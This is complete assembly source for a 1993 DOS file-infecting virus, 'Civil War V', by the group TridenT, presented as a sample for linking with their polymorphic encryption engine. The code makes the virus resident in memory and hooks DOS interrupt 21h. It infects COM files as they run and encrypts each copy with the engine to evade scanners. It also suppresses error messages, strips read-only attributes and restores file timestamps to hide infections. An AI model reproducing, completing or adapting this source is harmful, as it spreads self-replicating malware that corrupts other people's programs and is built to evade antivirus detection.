;****************************************************************************
;   Civil War V V1.0                                  			    *
;                                                			    *
;   Assembled with Tasm 2.5                                		    *
;   (c) Jan '93 [ Dark Helmet / TridenT ], The Netherlands            	    *
;									    *
;****************************************************************************
;									    *
; This is an example virus for the TPE engine.				    *
; We are not responsible if you use the TPE in an illegal or naughty way.   *
; The TridenT Polymorpic Engine version 1.3 should be used for linking      *
; with this virus.	           					    *
;									    *
;****************************************************************************

		.model tiny
		.radix	16
		.code

		org	100h		

		extrn	rnd_init:near
		extrn	rnd_get:near
		extrn	crypt:near
		extrn	tpe_top:near


len       	equ offset tpe_top - begin


dummy:         	db 0e9h, 03h, 00h, 44h, 48h, 00h   	; Jump + infection
		                                  	; marker

begin:         	Call virus                    		; make call to
                		                   	; push IP on stack

virus:         	pop  	bp                  		; get IP from stack.
          	sub  	bp,offset virus                	; adjust IP.

restore_host:  	mov  	di,0100h            		; recover beginning
          	lea  	si,ds:[carrier_begin+bp] 	; of carrier program.
          	mov  	cx,06h
          	rep  	movsb

check_resident:	mov	ah,0a0h         	    	; check if virus
         	int	21h                 		; already installed.
         	cmp	ax,0008h
         	je   	end_virus

adjust_memory: 	mov  	ax,cs                  		; start of Memory
          	dec  	ax                  		; Control Block
          	mov  	ds,ax
          	cmp  	byte ptr ds:[0000],5a      	; check if last
                                   			; block
          	jne  	abort                  		; if not last block
                                   			; end
          	mov  	ax,ds:[0003]           		; decrease memory
          	sub  	ax,200h		       		; by X kbyte lenght
          	mov  	ds:[0003],ax
		sub	word ptr ds:[0012],200h

install_virus: 	call	RND_init

		mov  	bx,ax                  		; es point to start
          	mov  	ax,es                  		; virus in memory
          	add  	ax,bx
          	mov  	es,ax
          	
		mov  	cx,len		         	; cx = lenght virus
          	mov  	ax,ds                  		; restore ds
          	inc  	ax
          	mov  	ds,ax
          	
		lea  	si,ds:[begin+bp]       		; point to start virus
          	lea  	di,es:0100             		; point to destination
          	rep  	movsb                  		; copy virus in
                                   			; memory
          	mov  	[virus_segment+bp],es         	; store start virus
                                   			; in memory
          	mov     ax,cs                 		; restore es
          	mov  	es,ax

hook_vector:   	cli					; no interups
          	mov  	ax,3521h			; revector int 21
          	int  	21h
		mov 	ds,[virus_segment+bp]
		mov  	old_21h-6h,bx
          	mov  	old_21h+2-6h,es

          	mov  	dx,offset main_virus - 6h
          	mov  	ax,2521h
          	int  	21h
          	sti

abort:         	mov  	ax,cs
         	mov  	ds,ax
          	mov  	es,ax

end_virus:     	mov	bx,0100h			; jump to begin
		jmp	bx				; host file

		
;*****************************************************************************

main_virus:    	pushf					
		cmp	ah,0a0h				; check virus call
		jne	new_21h				; no virus call
		mov	ax,0008h			; ax = id
		popf					; return id	
		iret
		
new_21h:	push	ds				; save registers
		push	es
		push	di
		push	si
		push	ax
		push	bx
		push	cx
		push	dx

check_exec:	cmp	ax,04b00h			; exec function?
		je	chk_com
		
continu:	pop	dx				; restore registers
		pop	cx
		pop	bx
		pop	ax
		pop	si
		pop	di
		pop	es
		pop	ds
		popf
		jmp	dword ptr cs:[old_21h-6]


chk_com:	mov	cs:[name_seg-6],ds
		mov	cs:[name_off-6],dx
		cld					; check extension
		mov	di,dx				; for COM
		push	ds
		pop	es
		mov	al,'.'				; search extension
		repne	scasb				; check for 'COM"
		cmp	word ptr es:[di],'OC'		; check 'CO'
		jne	continu
		cmp	word ptr es:[di+2],'M'		; check 'M'
		jne	continu
		
own_stack:	cli
		mov	cs:[old_sp-6],sp
		mov	cs:[old_ss-6],ss
		mov	ax,cs
		add	ax,150h
		mov	ss,ax
		mov	sp,100h
		sti
	
		call	set_int24h
		call	set_atribuut
				
open_file:	mov	ds,cs:[name_seg-6]
		mov	dx,cs:[name_off-6]
		mov	ax,3D02h			; open file
		call 	do_int21h
		jc	close_file

		mov	cs:[handle-6],ax
		mov	bx,ax	

		call	get_date	
		
check_infect:	mov	bx,cs:[handle-6]		; read first 6 bytes
		mov	ah,3fh
		mov	cx,06h
		lea	dx,cs:[carrier_begin-6]
		call	do_int21h
		
		push	cs
		pop	ds
		mov	al, byte ptr [carrier_begin-6]+3 ; check initials	
		mov	ah, byte ptr [carrier_begin-6]+4 ; 'D' and 'H'
		cmp	ax,cs:[initials-6]
		je	save_date			 ; if equal already
							 ; infect
		
get_lenght:	mov	ax,4200h			; file pointer begin
		call	move_pointer
		mov	ax,4202h			; file pointer end
		call	move_pointer
		sub	ax,03h				; ax = filelenght
		mov	cs:[lenght_file-6],ax
		
		call	write_jmp
		call	write_virus

save_date:	mov	bx,cs:[handle-6]
		mov	dx,cs:[date-6]
		mov	cx,cs:[time-6]
		mov	ax,5701h
		call	do_int21h


close_file:	mov	bx,cs:[handle-6]
		mov	ah,03eh				; close file
		call	do_int21h
		
		mov	dx,cs:[old_24h-6]		; restore int24h
		mov	ds,cs:[old_24h+2-6]
		mov	ax,2524h
		call	do_int21h
		

restore_stack:	cli
		mov	sp,cs:[old_sp-6]
		mov	ss,cs:[old_ss-6]
		sti
		

                jmp     continu



new_24h:	mov	al,03h
		iret

;---------------------------------------------------------------------------
;			PROCEDURES
;---------------------------------------------------------------------------

move_pointer:	push	cs
		pop	ds
		mov	bx,[handle-6]
		xor	cx,cx
		xor	dx,dx
		call	do_int21h
		ret

do_int21h:	pushf
		call 	dword ptr cs:[old_21h-6]
		ret

write_jmp:	mov	ax,4200h			; goto begin of file
		call	move_pointer

		mov	ah,40h				; write JMP instruction
		mov	cx,01h
		lea	dx,[jump-6]
		call	do_int21h

		mov	ah,40h				; write JMP offset
		mov	cx,02h
		lea	dx,[lenght_file-6]
		call	do_int21h

		mov	ah,40h				; write initials
		mov	cx,02h
                lea     dx,[initials-6]
		call	do_int21h
		ret

write_virus:	mov	ax,4202h			;goto end of file	
		call	move_pointer

TPE_engine:	mov	ax,cs				;ES points to 
		add	ax,90h				;worksegment
		mov	es,ax

		push	cs				;DS:DX code to encrypt
		pop	ds
		mov	dx,100h

		mov	bp,[lenght_file-6] 		;BP start of encryptor
		add	bp,103h
		
                mov     cx,len				;lenght code to encrypt

		xor	si,si				;distance encryptor/
							;decryptor = 0

                call    rnd_get         		;AX = type of 
 		call	crypt				;encryption

                mov     bx,cs:[handle-6]		;write virus
                mov     ah,40h				;at end of file
		call	do_int21h
                ret

get_date:	mov	ax,5700h
		call	do_int21h
		push	cs
		pop	ds
		mov	[date-6],dx
		mov	[time-6],cx
		ret

set_int24h:	mov	ax,3524h			; hook int 24h
		call	do_int21h
		mov	cs:[old_24h-6],bx
		mov	cs:[old_24h+2-6],es
		mov	dx,offset new_24h-6
		push	cs
		pop	ds
		mov	ax,2524h
		call	do_int21h
		ret

set_atribuut:	mov	ax,4300h			; get atribuut
		mov	ds,cs:[name_seg-6]
		mov	dx,cs:[name_off-6]
		call	do_int21h
		and	cl,0feh				; set atribuut
		mov	ax,4301h
		call	do_int21h		
		ret

;---------------------------------------------------------------------------
;				DATA
;---------------------------------------------------------------------------

virus_name	db  "Civil War V v1.0, (c) Jan '92"
old_21h        	dw  00h,00h
old_24h		dw  00h,00h
old_ss		dw  ?	
old_sp		dw  ?
carrier_begin  	db  090h, 0cdh, 020h, 044h, 048h, 00h
jump		db  0e9h
name_seg	dw  ?
name_off	dw  ?
virus_segment  	dw  ?
lenght_file	dw  ?
handle		dw  ?
date		dw  ?
time		dw  ?
initials	dw  4844h
writer		db  "[ DH / TridenT ]"

          	end dummy
